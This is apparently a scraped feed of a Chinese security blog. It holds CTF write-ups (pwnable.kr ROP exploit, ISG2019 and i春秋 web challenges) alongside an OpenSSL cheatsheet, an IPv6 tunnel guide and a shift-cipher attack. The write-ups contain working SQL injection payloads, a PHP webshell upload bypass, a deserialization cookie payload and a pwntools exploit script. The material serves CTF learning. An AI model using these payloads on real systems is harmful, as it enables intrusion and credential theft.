== c) { C(); } else if (v2 == d) { D(); } else if (v2 == e) { E(); } else if (v2 == f) { F(); } else if (v2 == g) { G(); } else { printf(\u0026#34;How many EXP did you earned? :\u0026#34;); gets(s); if (atoi(s) == sum ) { fd = open(\u0026#34;flag\u0026#34;, 0); s[read(fd, s, 0x64u)] = 0; puts(s); close(fd); exit(0); } puts(\u0026#34;You\u0026#39;d better get more experience to kill Voldemort\u0026#34;); } return 0; } 显然最后一个 else 部分的 gets 可以导致栈溢出，但是程序开启了 NX 使得无法在栈上执行 shellcode，根据题目提示，这题我们需要利用 ROP 技术找到 7 个 gadgets，最终劫持返回地址。\n根据 IDA 提示，s 位于 ebp-0x74 与返回地址相差 0x74+0x4=0x78。注意到 ropme 函数的地址 0x080a0009 中含有 0a 这个截断字符，因此我们不可能将其中的地址写到栈上，也就是说不能绕过 if (atoi(s) == sum ) 直接去读 flag。那我们就需要找到 sum：\nunsigned int init_ABCDEFG() { int v0; // eax unsigned int result; // eax unsigned int buf; // [esp+8h] [ebp-10h] int fd; // [esp+Ch] [ebp-Ch] fd = open(\u0026#34;/dev/urandom\u0026#34;, 0); if (read(fd, \u0026amp;buf, 4u) != 4 ) { puts(\u0026#34;/dev/urandom error\u0026#34;); exit(0); } close(fd); srand(buf); a = -559038737 * rand() % 0xCAFEBABE; b = -559038737 * rand() % 0xCAFEBABE; c = -559038737 * rand() % 0xCAFEBABE; d = -559038737 * rand() % 0xCAFEBABE; e = -559038737 * rand() % 0xCAFEBABE; f = -559038737 * rand() % 0xCAFEBABE; v0 = rand(); g = -559038737 * v0 % 0xCAFEBABE; result = f + e + d + c + b + a + -559038737 * v0 % 0xCAFEBABE; sum = result; return result; } 由于调用了 srand，我们无法预测 abcdefg 的值，但是我们又需要它们的值才能计算出 sum。幸运的是，在 ropme 函数中刚才被我们忽略的上面的一大串 if 语句能带来一些帮助。当输入的 v2 等于这些随机数中的任一个时，就会执行相应的大写字母作为名字的函数，而这些函数会将随机数本身打印出来，这样我们就能拿到 7 个随机数的值了，相加就能得到 sum。\n我们从 IDA 中拿到 7 个函数的地址，前面先填充 0x78 字节，随后依次追加 7 个函数的地址，那么一个函数返回后就会返回到下一个函数的入口上，构成 ROP 链，最后再返回 ropme 计算 sum。然而前面提到 ropme 地址无法写到栈上，但我们可以利用 main 函数中 call ropme 所在地址 0x0809fffc，来返回到 ropme。\n因此，最终 payload 为：\nfrom pwn import * p = remote(\u0026#39;pwnable.kr\u0026#39;, 9032) p.recvuntil(\u0026#39;:\u0026#39;) p.sendline(\u0026#39;1\u0026#39;) p.recvuntil(\u0026#39;:\u0026#39;) payload = \u0026#39;a\u0026#39;*0x78 + p32(0x0809fe4b) + p32(0x0809fe6a) + p32(0x0809fe89) + p32(0x0809fea8) + p32(0x0809fec7) + p32(0x0809fee6) + p32(0x0809ff05) + p32(0x0809fffc) p.sendline(payload) p.recvline() sum = 0 for i in range(7): p.recvuntil(\u0026#39;+\u0026#39;) sum += int(p.recvline()[:-2]) # strip )\\n p.recvuntil(\u0026#39;:\u0026#39;) p.sendline(\u0026#39;1\u0026#39;) p.recvuntil(\u0026#39;:\u0026#39;) p.sendline(str(sum)) print p.recv() ","date":"2019-10-09","permalink":"/posts/pwnkr-toddler/","section":"Posts","summary":"\u003cp\u003e画风很可爱的 Pwn 题练习网站。\u003c/p\u003e","title":"Pwnable.kr Toddler's Bottle 练习记录"},{"content":"喜迎国庆。\n新配置的代理服务器访问谷歌时，有时会遇到要求人机身份验证的问题。查找了一些资料后，发现应该是谷歌 ban 了对应的 IPv4 地址所导致的（说到这里，记录一个 好用的网站）。\n最简单的解决办法就是使用 IPv6 进行访问，为此我们需要开通一个 IPv6 隧道。在这个 良心网站 上注册个账号，然后 Create Regular Tunnel，填写服务器 IPv4 地址并选择隧道服务器后，就能看到隧道的详细信息了。例如，Client IPv6 Address 显示了我们的服务器的 IPv6 地址。\n接下来，在 Example Configurations 中选择自己服务器的 OS，并根据提示在服务器上完成相应配置即可。Debian 和 Ubuntu 有自己的选项，CentOS 及其它常用 Linux 系统可以选择 Linux-net-tools。\n至此，服务器已经可以通过 IPv6 访问谷歌了，测试：\n$ ping6 ipv6.google.com 注：可能需要在 /etc/hosts 中加入部分 谷歌相关 IPv6 地址。\n","date":"2019-09-26","permalink":"/posts/ipv6-tunnel/","section":"Posts","summary":"\u003cp\u003e喜迎国庆。\u003c/p\u003e","title":"舍近求远：开通 IPv6 隧道"},{"content":"《密码学基础》小作业。\n背景 # 对常见的移位密码的攻击，一般是穷举密钥和可能的明文，然后判断其中哪个明文有意义。然而，对于 “有意义” 的判断是基于人的主观意志，对计算机而言很难自动化。因此引入破解替换密码时常用的词频分析法，来实现对移位密码的自动化攻击。\n攻击简介 # 用 $p_i$ 表示第 $i$ 个字母在正常英文文本中出现的概率，$0\u0026lt;=i\u0026lt;=25$。根据统计数据，有：\n$$ \\sum_{i=0}^{25}p_i^2\\approx 0.065 $$\n用 $q_i$ 表示第 $i$ 个字母在密文文本中出现的概率（准确地说，频率），$0\u0026lt;=i\u0026lt;=25$。如果密钥为 $k$，则对于每个 $i$ 而言，$q_{i+k}$ 应约等于 $p_i$。\n如果对于每个 $j\\in\\lbrace 0,\u0026hellip;,25\\rbrace$，我们计算 $I_j$ 的值：\n$$ I_j=\\sum_{i=0}^{25}p_i\\cdot q_{i+j} $$\n那么对于实际使用的密钥 $k$，应有 $I_k\\approx 0.065$。\n代码 # import math key_space = 26 c = \u0026#39;OVDTHUFWVZZPISLRLFZHYLAOLYL\u0026#39; lenc = len(c) std = 0.065 dev = 99 k = 0 # from wikipedia p = [0.08167,0.01492,0.02782,0.04253,0.12702, 0.02228,0.02015,0.06094,0.06966,0.00153, 0.00772,0.04025,0.02406,0.06749,0.07507, 0.01929,0.00095,0.05987,0.06327,0.09056, 0.02758,0.00978,0.02360,0.00150,0.01974, 0.00074] q = [] def num2ord(num): return ord(\u0026#39;A\u0026#39;) + num def ord2num(i): return i - ord(\u0026#39;A\u0026#39;) for i in range(key_space): q.append(c.count(chr(num2ord(i)) ) * 1.0 / lenc) for j in range(key_space): Ij = 0 for i in range(key_space): Ij += p[i] * q[(i+j) % key_space] cur_dev = math.fabs(Ij - std) # deviation if (cur_dev \u0026lt; dev): dev = cur_dev k = j print(\u0026#39;Key: %d\u0026#39; % k) m = \u0026#39;\u0026#39; for i in range(lenc): m += chr(num2ord(ord2num(ord(c[i])-k) % key_space)) print(\u0026#39;Plaintext: %s\u0026#39; % m) # Key: 7 # Plaintext: HOWMANYPOSSIBLEKEYSARETHERE ","date":"2019-09-13","permalink":"/posts/auto-atk-shift-cipher/","section":"Posts","summary":"\u003cp\u003e《密码学基础》小作业。\u003c/p\u003e","title":"对移位密码的自动化攻击"},{"content":"仅仅记录了一些较常用的命令实例，具体命令、选项与说明推荐查阅官方文档。\n注：本速查表由于篇幅限制，使用时需要读者举一反三。例如：不加 -out 选项会默认输出到 stdout。\nbase64 # # 复制文件 openssl enc -none -in file1 -out file2 # base64 编码 openssl enc -a -in plain -out plainb64 # base64 解码 openssl enc -a -d -in plainb64 -out plain # 从 stdin 读入并 base64 编码，无 -n 默认添加新行 echo -n \u0026#39;string\u0026#39; | openssl enc -a 对称密码 # # 所有可用的密码算法 openssl ciphers -v # 所有高强度 AES 加密算法 openssl ciphers -v \u0026#39;AES+HIGH\u0026#39; # 加密 openssl enc -aes-256-cbc -in plain -out cipher # 加密并 base64 编码 openssl enc -a -aes-256-cbc -in plain -out cipher # 加密，直接设置口令 openssl enc -aes-256-cbc -in plain -out cipher -pass pass:123456 # 加密，从文件中读取口令 openssl enc -aes-256-cbc -in plain -out cipher -pass file:/home/password.txt # 加密，从环境变量中读取口令 openssl enc -aes-256-cbc -in plain -out cipher -pass env:mypass # 加密，设置密钥和 IV openssl enc -aes-256-cbc -in plain -out cipher -k deadbeef -iv deadbeef # 加密，不使用盐 openssl enc -aes-256-cbc -in plain -out cipher -nosalt # 加密，使用指定盐 openssl enc -aes-256-cbc -in plain -out cipher -S deadbeef # 解密 openssl enc -d -aes-256-cbc -in cipher -out plain 公钥密码 # RSA 密钥管理 # # 生成指定长度私钥 openssl genrsa -out privkey.pem 2048 # 生成私钥并加密 openssl genrsa -des3 -out privkey.pem # 生成私钥并加密，直接设置口令 openssl genrsa -des3 -out privkey.pem -passout pass:123456 # 生成私钥，用文件作为随机种子 openssl genrsa -out privkey.pem -rand random.txt # 根据私钥生成公钥 openssl rsa -in privkey.pem -out pubkey.pem -pubout # 移除对私钥文件的加密 openssl rsa -in privkey.pem -out newkey.pem # PKCS#12 私钥转 PEM openssl rsa -in privkey.p12 -inform p12 -passin pass:123456 -out newkey.pem -passout pass:654321 -aes256 # 查看私钥内容 openssl rsa -in privkey.pem -passin pass:123456 -text -noout # 查看公钥模数 openssl rsa -in pubkey.pem -pubin -modulus -noout RSA 加解密与签名 # # 公钥加密 openssl rsautl -encrypt -in plain -out cipher -inkey pubkey.pem -pubin # 私钥解密 openssl rsautl -decrypt -in cipher -out plain -inkey privkey.pem # 用证书中公钥加密，加密前颠倒明文 openssl rsautl -encrypt -in plain -rev -out cipher -inkey cert.pem -certin # 私钥签名 openssl rsautl -sign -in plain -out sig -inkey privkey.pem # 私钥签名并显示十六进制数据 openssl rsautl -sign -in plain -inkey privkey.pem -hexdump # 公钥验证 openssl rsautl -verify -in sig -inkey pubkey.pem -pubin # 用 PKCS#12 证书中私钥签名 openssl rsautl -sign -in plain -out sig -inkey cert.pfx -certin -keyform pkcs12 # 用 PKCS#12 证书中公钥验证 openssl rsautl -verify -in sig -out plain -inkey cert.pfx -certin -keyform pkcs12 其它公钥密码 # # 生成 DH 参数，5 为原根 openssl dhparam -outform d -out dh512.der -5 512 # 生成 DSA 风格 DH 参数 openssl dhparam -dsaparam -out dh512.pem 512 # 生成 DSA 密钥参数 openssl dsaparam -out dsa512.pem 512 # DSA 密钥参数文件转 C 代码 openssl dsaparam -C -noout -in dsa512.pem # 查看 DSA 密钥参数内容 openssl dsaparam -text -noout -in dsa512.pem # 生成 DSA 私钥并加密 openssl gendsa -out dsakey.pem -aes256 -passout pass:123456 dsa512.pem # DSA 私钥，PEM 转 DER openssl dsa -aes-256-cbc -in dsakey.pem -passin pass:123456 -out dsakey.der -outform d -passout pass:654321 # 根据 DSA 私钥生成公钥 openssl dsa -in dsakey.pem -passin pass:123456 -out dsapubkey.pem -pubout # 所有可用的椭圆曲线 openssl ecparam -list_curves # 生成 EC 密钥 openssl ecparam -out key.pem -name prime256v1 -genkey 哈希与摘要 # # 所有可用的哈希算法 openssl -list-message-digest-commands # RSA+SHA1 签名 openssl sha1 -sign privkey.pem -out sig plain # DSA+DSS1 验证签名 openssl dgst -dss1 -verify dsapubkey.pem -signature sig plain # RIPEMD-160 哈希文件 openssl rmd160 -out sig plain # PKCS#12 格式的 RSA 私钥签名文件，并使用多个文件作为随机种子 openssl sha1 -sign -keyform pkcs12 privkey.pfx -out sig -rand file1;file2;file3 plain # 加 2 字符盐哈希指定的口令 openssl passwd MyPassword # 加 8 字符盐哈希指定的口令 openssl passwd -1 MyPassword # 哈希指定的口令，使用指定的 8 字符盐 openssl passwd -1 -salt deadbeef MyPassword 证书 # # 生成自签名证书，不加密，使用新生成的 RSA 密钥 openssl req -x509 -nodes -days 365 -sha256 -newkey rsa:2048 -keyout privkey.pem -out mycert.cer # 生成证书请求并加密，使用已有的 RSA 密钥，加密方式限定 DES3-CBC，输出格式限定 PEM openssl req -new -key privkey.pem -passout pass:123456 -out req.pem # 生成自签名证书并加密，使用已有 DSA 密钥参数文件生成 DSA 密钥，限定同上 openssl req -new -newkey dsa:dsa512.pem -keyout dsakey.pem -passout pass:123456 -out req.pem # 验证一个证书请求的签名 openssl req -verify -in req.pem -noout -verify -key privkey.pem # 查看 X.509 证书的序列号，哈希值和摘要 openssl x509 -in mycert.pem -noout -serial -hash -fingerprint # X.509 证书，PEM 转 DER openssl x509 -in mycert.pem -inform p -out mycert.der -outform d # X.509 转 PKCS#12，加密方式限定 DES3-CBC openssl pkcs12 -export -in mycert.pem -out cert.pfx -name \u0026#34;My Certificate\u0026#34; # PKCS#12 转 PEM，无加密 openssl pkcs12 -in cert.pfx -out mycert.pem -nodes # 查看 PKCS#12 证书信息 openssl pkcs12 -in cert.pfx -noout -info # 验证证书 openssl verify mycert.pem SSL/TLS # # 连接远程 SMTP 服务器的 25(TLS) 端口 openssl s_client -connect remote.host:25 -starttls smtp # 连接远程 STMP 服务器的 465(SSL) 端口，并显示其证书链 openssl s_client -connect remote.host:465 -showcerts # 连接远程服务器的 443(HTTPS) 端口并使用 TLS 协议的 SNI 扩展访问指定主机 openssl s_client -connect www.massivehost.com:443 -servername www.myhost.com # 开启 SSL 服务器，默认监听 4433 端口，单 html 页面 openssl s_server -cert mycert.pem -www # 开启 SSL 服务器，监听 443 端口，拥有类似反代服务器的 web 目录（即当前目录） openssl s_server -cert mycert.pem -accept 443 -WWW # 远程服务器 443 端口连接测速，用新 session 访问 test.html，且只使用 SSLv3 以及高强度加密算法，测试指标为 10 秒内连接次数 openssl s_time -connect remote.host:443 -www /test.html -new -ssl3 -time 10 -cipher HIGH 素数 # # 素性判定 openssl prime 561 # 16 进制数素性判定 openssl prime -hex 2f # 产生指定长度的素数 openssl prime -generate -bits 64 # 产生指定长度的 16 进制素数 openssl prime -generate -bits 64 -hex 其它 # # 翻译 SSL 错误信息，最后的参数是错误码 openssl errstr 0407006A # 产生 1024 字节随机数据，并 base64 编码 openssl rand -base64 -out random-data 1024 # RSA 算法测速 openssl speed rsa ","date":"2019-09-02","permalink":"/posts/openssl-cheatsheet/","section":"Posts","summary":"\u003cp\u003e仅仅记录了一些较常用的命令实例，具体命令、选项与说明推荐查阅官方文档。\u003c/p\u003e","title":"OpenSSL 常用命令速查表"},{"content":"题目难度不算大，但是考验脑洞。\n签到题 # 键盘密码，四个字母中间的那个字母就是明文。\n传统安全服务初体验 # 扫目录扫出许多路径，唯一有用的是 /admin/upload.php，提示只能 image 或 text/xml。设置 Content-Type 为 text/xml 上传一张普通图片发现可以成功，存储在 upload/ 目录下，但是存在了 1s 就被删了，估计是要写脚本访问。\n尝试访问 /admin/upload/ 发现可以浏览目录，flag 居然就直接就显示在这个目录下？？感觉像是非预期解。\n攻击日志分析 # 导出 HTTP 对象，WinRAR 修复即可。\n轻松一刻 # 试着玩了一下之后发现生成了一个 save1 二进制文件，用 WinHex 打开只能看到 3 个 ASCII 字符 2 A C，把 2 改成 3 之后载入游戏，发现来到了新的一关，因此猜测这个是关卡序号，逐次尝试后发现改成 5 可以得到 flag。\n安全专家的基本修养 # 对图片 binwalk 分离出压缩包，根据提示 five 用 5 位数字爆破密码 77777，得到字符串：\nQKM{Waoq_Fzuzns_kqaoc_!!!!_dk} 根据提示 isg2019!，将其作为密钥进行维吉尼亚解密：\nISG{Oiii_Ntmhhk_sksww_!!!!_vs} 但是答案错误，想了半天才知道第二个提示 想不到是英文的吧 意思是把密钥中的数字换成英语，即 isgtwozeroonenine，重新维吉尼亚解密即可。\n脑洞题没什么意思。但是如果能早点想到维吉尼亚密钥里不应该有数字的话，可能也不至于太需要脑洞？\nweb2 # 忘记这题的名字了，总之很容易发现是注入题，在 hint.php 中的 v1 里输入一个 ' 得到报错信息，尝试报错注入，最终 payload 类似：\nv1=1\u0026#39;,\u0026#39;2\u0026#39;or updatexml(1,concat(0x7e,(select temp.xxx from (select group_concat(kkk) as xxx from isgta61e) temp),0x7e),1),\u0026#39;3\u0026#39;,\u0026#39;4\u0026#39;);#\u0026amp;v2=\u0026amp;v3=\u0026amp;v4= payload 中间部分的构造原因稍后解释。\n其实如果按照报错注入的方式构造 payload 那么只能得到表里的信息，但是光看表里的信息并没有什么用，只能看到关键在于第二行（__ISG 开头的那行）。这里的坑点在于，无论在 hint.php 中 POST 了什么，都会跳转到 ffflllaaaggg.php，这个页面上只有一句话 try get flag?，这句话本身是一个双关，是在提示我们用 GET 方法传 flag 参数，这一点感觉很脑洞……\n我们访问 ffflllaaaggg.php?flag= 后就可以得到 ffflllaaaggg.php 的源码：\n\u0026lt;?php include \u0026#34;ISGClass.php\u0026#34;; echo \u0026#34;try get flag?\u0026#34;; if(isset($_GET[\u0026#34;flag\u0026#34;])) { highlight_file(\u0026#34;ffflllaaaggg.php\u0026#34;); } if(isset($_COOKIE[\u0026#34;ISG\u0026#34;])){ highlight_file(\u0026#34;ISGClass.php\u0026#34;); $isg = urldecode($_COOKIE[\u0026#34;ISG\u0026#34;]); $isg = unserialize($isg); } if(isset($_POST[\u0026#34;v1\u0026#34;]) and isset($_POST[\u0026#34;v2\u0026#34;]) and isset($_POST[\u0026#34;v3\u0026#34;]) and isset($_POST[\u0026#34;v4\u0026#34;])){ $InsertData = new Conn(); $InsertData-\u0026gt;InsertData($_POST[\u0026#34;v1\u0026#34;], $_POST[\u0026#34;v2\u0026#34;], $_POST[\u0026#34;v3\u0026#34;], $_POST[\u0026#34;v4\u0026#34;]); } ?\u0026gt; 这里注意到需要设置一个 ISG 的 Cookie 来读取 ISGClass.php，这个 Cookie 值会被 URL 解码后反序列化。我们随意设置一个 ISG 的 Cookie 后查看源码：\n\u0026lt;?php include \u0026#34;Conn.php\u0026#34;; class ISGClass { var $value1; var $value2; public function __wakeup() { $Kkk = new Conn(); $Kkk = $Kkk-\u0026gt;SelectData(); if(gettype($this-\u0026gt;value1) == gettype($Kkk) and $this-\u0026gt;value1 == $Kkk){ highlight_file(\u0026#34;{$this-\u0026gt;value2}.php\u0026#34;); }else{ echo \u0026#34;find kkk!\u0026#34;; } } } PHP 在反序列化前会先执行 __wakeup() 函数，这里我们不需要绕过这个函数。猜测这里的 Kkk 就是刚才我们查到的数据库里的 kkk 字段，那么我们需要构造 value1 使得其类型和值都与 kkk 相同。具体是哪个 kkk 呢？当然是标有 ISG 的第二行了，该行 kkk 值为 54t7869yi。\n这样以后我们就能读取 value2 指向的文件了，我们目前还没有读的就是 hint.php。构造 payload：\nO:8:\u0026#34;ISGClass\u0026#34;:2:{s:6:\u0026#34;value1\u0026#34;;s:9:\u0026#34;54t7869yi\u0026#34;;s:6:\u0026#34;value2\u0026#34;;s:4:\u0026#34;hint\u0026#34;;} 然后 URL 编码：\nO%3A8%3A%22ISGClass%22%3A2%3A%7Bs%3A6%3A%22value1%22%3Bs%3A9%3A%2254t7869yi%22%3Bs%3A6%3A%22value2%22%3Bs%3A4%3A%22hint%22%3B%7D 最后设置到 Cookie ISG 里，POST 给 ffflllaaaggg.php?flag= 即可得到 hint.php 源码，flag 就在其中。\n这题 get flag 的双关既考验脑洞，又是解题的关键，所以略坑。\n印象里还有一题 SSRF 的，利用的是 PHP 反序列化漏洞，然而环境无法复现了。。\n","date":"2019-08-28","permalink":"/posts/isg2019/","section":"Posts","summary":"\u003cp\u003e题目难度不算大，但是考验脑洞。\u003c/p\u003e","title":"ISG2019 线上赛比赛记录"},{"content":"","date":"2019-08-24","permalink":"/tags/hash/","section":"Tags","summary":"","title":"Hash"},{"content":"i 春秋上的题都是比赛真题，所以会比较有意思，也更复杂一些。\n爆破 - 1 # \u0026lt;?php include \u0026#34;flag.php\u0026#34;; $a = @$_REQUEST[\u0026#39;hello\u0026#39;]; if(!preg_match(\u0026#39;/^\\w*$/\u0026#39;,$a)){ die(\u0026#39;ERROR\u0026#39;); } eval(\u0026#34;var_dump($$a);\u0026#34;); show_source(__FILE__); ?\u0026gt; 要求参数 hello 为纯字母，又看到 eval(var_dump($$a)); 语句，可以想到使用 $GLOBALS 打印出所有变量，payload：\n?hello=GLOBALS 等等，好像没爆破啊？感觉是非预期解。\n爆破 - 2 # \u0026lt;?php include \u0026#34;flag.php\u0026#34;; $a = @$_REQUEST[\u0026#39;hello\u0026#39;]; eval(\u0026#34;var_dump($a);\u0026#34;); show_source(__FILE__); 提示 flag 不在变量中，那么只能直接读 flag.php 文件了，payload：\n?hello=file(\u0026#39;flag.php\u0026#39;) 另一种 payload 则类似注入：\n?hello=);show_source(‘flag.php’);// 爆破 - 3 # \u0026lt;?php error_reporting(0); session_start(); require(\u0026#39;./flag.php\u0026#39;); if(!isset($_SESSION[\u0026#39;nums\u0026#39;])){ $_SESSION[\u0026#39;nums\u0026#39;] = 0; $_SESSION[\u0026#39;time\u0026#39;] = time(); $_SESSION[\u0026#39;whoami\u0026#39;] = \u0026#39;ea\u0026#39;; } if($_SESSION[\u0026#39;time\u0026#39;]+120\u0026lt;time()){ session_destroy(); } $value = $_REQUEST[\u0026#39;value\u0026#39;]; $str_rand = range(\u0026#39;a\u0026#39;, \u0026#39;z\u0026#39;); $str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]; if($_SESSION[\u0026#39;whoami\u0026#39;]==($value[0].$value[1]) \u0026amp;\u0026amp; substr(md5($value),5,4)==0){ $_SESSION[\u0026#39;nums\u0026#39;]++; $_SESSION[\u0026#39;whoami\u0026#39;] = $str_rands; echo $str_rands; } if($_SESSION[\u0026#39;nums\u0026#39;]\u0026gt;=10){ echo $flag; } show_source(__FILE__); ?\u0026gt; 首先如果 cookie 中不设置 nums 会给 whoami 设置默认值 ea，且 session 只能维持 120ms，所以应该需要用脚本跑。\n接下来，如果 whoami 和传入的 value 相同，且 value 的 MD5 值子串为 0，那么 nums 就加 1，whoami 更新为两个新的随机字母。后一个条件可以很容易地用数组绕过。\n我们尝试传入 value=ea，果然显示了 whoami 的下一个值。脚本：\nimport requests url = \u0026#39;http://4451e735c9e046bcb09a4404756ca952c586da682cfe47b9.changame.ichunqiu.com/?value[]=ea\u0026#39; ss = requests.session() r = ss.get(url) for i in range(10): r = ss.get(url[:-2] + r.text[0:2]) print(r.text[:50]) 需要注意的是所有请求都要维持在同一 session 下。\n这题终于有点爆破的意思了。\nUpload # 尝试上传 php 一句话木马，发现过滤了 \u0026lt;? 和 php，对前者利用 \u0026lt;script\u0026gt; 绕过，后者则大写绕过。payload：\n\u0026lt;script language=\u0026#34;PHP\u0026#34;\u0026gt; eval($_POST[\u0026#39;ant\u0026#39;]); \u0026lt;/script\u0026gt; 上传 getshell，在上级目录得到 flag.php。\nCode # 题目链接中含有 ?jpg=hei.jpg，猜测可能可以通过这个读文件，尝试 ?jpg=index.php，F12 得到 base64 后的源代码，解码：\n\u0026lt;?php /** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */ header(\u0026#39;content-type:text/html;charset=utf-8\u0026#39;); if(! isset($_GET[\u0026#39;jpg\u0026#39;])) header(\u0026#39;Refresh:0;url=./index.php?jpg=hei.jpg\u0026#39;); $file = $_GET[\u0026#39;jpg\u0026#39;]; echo \u0026#39;\u0026lt;title\u0026gt;file:\u0026#39;.$file.\u0026#39;\u0026lt;/title\u0026gt;\u0026#39;; $file = preg_replace(\u0026#34;/[^a-zA-Z0-9.]+/\u0026#34;,\u0026#34;\u0026#34;, $file); $file = str_replace(\u0026#34;config\u0026#34;,\u0026#34;_\u0026#34;, $file); $txt = base64_encode(file_get_contents($file)); echo \u0026#34;\u0026lt;img src=\u0026#39;data:image/gif;base64,\u0026#34;.$txt.\u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; /* * Can you find the flag file? * */ ?\u0026gt; 注意这里会对 file 进行过滤，将非数字 / 字母删除，并将 config 换成 _，但是我们并不知道我们要读的文件是什么。\n这时可以注意到注释：Created by PhpStorm，猜想是 .idea 泄漏，因此访问 /.idea/workspace.xml，可以发现文件 fl3g_ichuqiu.php。由于 _ 不是数字或字母，我们应用上述规则访问 fl3gconfigichuqiu.php：\nindex.php?jpg=fl3gconfigichuqiu.php 解码得到：\n\u0026lt;?php /** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */ error_reporting(E_ALL || ~E_NOTICE); include(\u0026#39;config.php\u0026#39;); function random($length, $chars =\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz\u0026#39;) { $hash = \u0026#39;\u0026#39;; $max = strlen($chars) - 1; for($i = 0; $i \u0026lt; $length; $i++) { $hash .= $chars[mt_rand(0, $max)]; } return $hash; } function encrypt($txt,$key){ for($i=0;$i\u0026lt;strlen($txt);$i++){ $tmp .= chr(ord($txt[$i])+10); } $txt = $tmp; $rnd=random(4); $key=md5($rnd.$key); $s=0; for($i=0;$i\u0026lt;strlen($txt);$i++){ if($s == 32) $s = 0; $ttmp .= $txt[$i] ^ $key[++$s]; } return base64_encode($rnd.$ttmp); } function decrypt($txt,$key){ $txt=base64_decode($txt); $rnd = substr($txt,0,4); $txt = substr($txt,4); $key=md5($rnd.$key); $s=0; for($i=0;$i\u0026lt;strlen($txt);$i++){ if($s == 32) $s = 0; $tmp .= $txt[$i]^$key[++$s]; } for($i=0;$i\u0026lt;strlen($tmp);$i++){ $tmp1 .= chr(ord($tmp[$i])-10); } return $tmp1; } $username = decrypt($_COOKIE[\u0026#39;user\u0026#39;],$key); if ($username ==\u0026#39;system\u0026#39;){ echo $flag; }else{ setcookie(\u0026#39;user\u0026#39;,encrypt(\u0026#39;guest\u0026#39;,$key)); echo \u0026#34;╮(╯▽╰)╭\u0026#34;; } ?\u0026gt; 先不管加解密过程，只看最后几行主程序：将 cookie 中的 user 通过 key 解密，如果得到明文为 system 则成功，否则将返回 guest 经过 key 加密后的密文。显然后者是我们获得 key 值的关键。\n然后关注加密过程：先将每个字符的 ASCII 码加 10 得到新的 txt，随后随机生成 4 个字符 rnd 与 key 拼接后进行 MD5，得到新 key。将新 txt 与新 key 按字符异或得到 ttmp，若 txt 的长度超出 key 则在 key 后继续拼接 key。最后，返回 rnd 拼接上 ttmp 后的 base64 值就是密文。\n附 python2 脚本（python3 中的 byte 和 str 转换可能导致错误结果）：\nimport requests import base64 url = \u0026#39;http://036fb8c596914fd18ad96399893a61dd9da80da355bf450e.changame.ichunqiu.com/fl3g_ichuqiu.php\u0026#39; cookie = requests.get(url).cookies[\u0026#39;user\u0026#39;] txt = base64.b64decode(cookie) rnd = txt[:4] ttmp = txt[4:] key = list(\u0026#39;aaaaaa\u0026#39;) guest = list(\u0026#39;guest\u0026#39;) system = list(\u0026#39;system\u0026#39;) for i in range(5): guest[i] = chr(ord(guest[i]) + 10) for i in range(5): key[i] = chr(ord(ttmp[i]) ^ ord(guest[i])) for i in range(6): system[i] = chr(ord(system[i]) + 10) cookies = [] for c in \u0026#39;1234567890abcdef\u0026#39;: # md5 key[5] = c ttnew = \u0026#39;\u0026#39; for i in range(6): ttnew += chr(ord(key[i]) ^ ord(system[i])) cookies.append(base64.b64encode(rnd + ttnew)) for i in cookies: cookie = {\u0026#39;user\u0026#39;: i} r = requests.get(url=url, cookies=cookie) print r.text 这题才应该叫爆破。。最后其实是爆破 key 的第 6 位才出的结果。\nYeserCMS # 进入 CMS 乱点一波发现是从 cmseasy，网上查到了 无限制报错注入漏洞。\n仿照漏洞 payload 来进行注入，POST 数据：\nxajax=Postdata\u0026amp;xajaxargs[0]=\u0026lt;xjxquery\u0026gt;\u0026lt;q\u0026gt;detail=xxxxxx\u0026#39;,(updatexml(1,concat(0x7e,mid((select group_concat(concat(database())) ),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- \u0026lt;/q\u0026gt;\u0026lt;/xjxquery\u0026gt; 得到数据库名 Yeser。\nxajax=Postdata\u0026amp;xajaxargs[0]=\u0026lt;xjxquery\u0026gt;\u0026lt;q\u0026gt;detail=xxxxxx\u0026#39;,(updatexml(1,concat(0x7e,mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- \u0026lt;/q\u0026gt;\u0026lt;/xjxquery\u0026gt; 这里由于长度无法显示所有表，可以修改 1,32 的 1 来查看后续表，我们需要的是 yesercms_user。\nxajax=Postdata\u0026amp;xajaxargs[0]=\u0026lt;xjxquery\u0026gt;\u0026lt;q\u0026gt;detail=xxxxxx\u0026#39;,(updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;yesercms_user\u0026#39;),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- \u0026lt;/q\u0026gt;\u0026lt;/xjxquery\u0026gt; 这里也会有许多列，我们需要的是 username 和 password。\nxajax=Postdata\u0026amp;xajaxargs[0]=\u0026lt;xjxquery\u0026gt;\u0026lt;q\u0026gt;detail=xxxxxx\u0026#39;,(updatexml(1,concat(0x7e,mid((select concat(username,password) from yesercms_user),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- \u0026lt;/q\u0026gt;\u0026lt;/xjxquery\u0026gt; 这里的 password 显示不全，同样修改 1,32 的 1 来查看完整的 MD5 值：ff512d4240cbbdeafada404677ccbe61。解密得到密码：Yeser231。登录并进入后台管理页面。\n管理页面内容很多，但是都没有什么注入点。最终，在 模板-\u0026gt;当前模板编辑 中发现，编辑模板时会先读取相应的文件。因此我们任选一个文件，点击 编辑 并抓包，将唯一的参数 id 修改为想读取的文件。经测试，这里应该是 ../../flag.php。\nXSS 平台 # 尝试注入无果，构造非法参数 pass=bbb\u0026amp;email[]=aaa 得到报错信息，其中有一行：\nFile \u0026#34;/var/www/html/rtiny/login.py\u0026#34;, line 20, in post 结合题目名，得知这是使用 RTiny 编写的 XSS 平台，项目地址在 这里。其中，rtiny/lock.py 存在 SQL 注入漏洞，post 方法中对 username 没有任何过滤：\n#!/usr/bin/env python # -*- coding:utf-8 -*- __author__ = \u0026#39;r0ker\u0026#39; import tornado.web from function import md5 import db from config import URL class LockHandler(tornado.web.RequestHandler): def get(self): self.set_secure_cookie(\u0026#34;lock\u0026#34;,\u0026#39;1\u0026#39;) 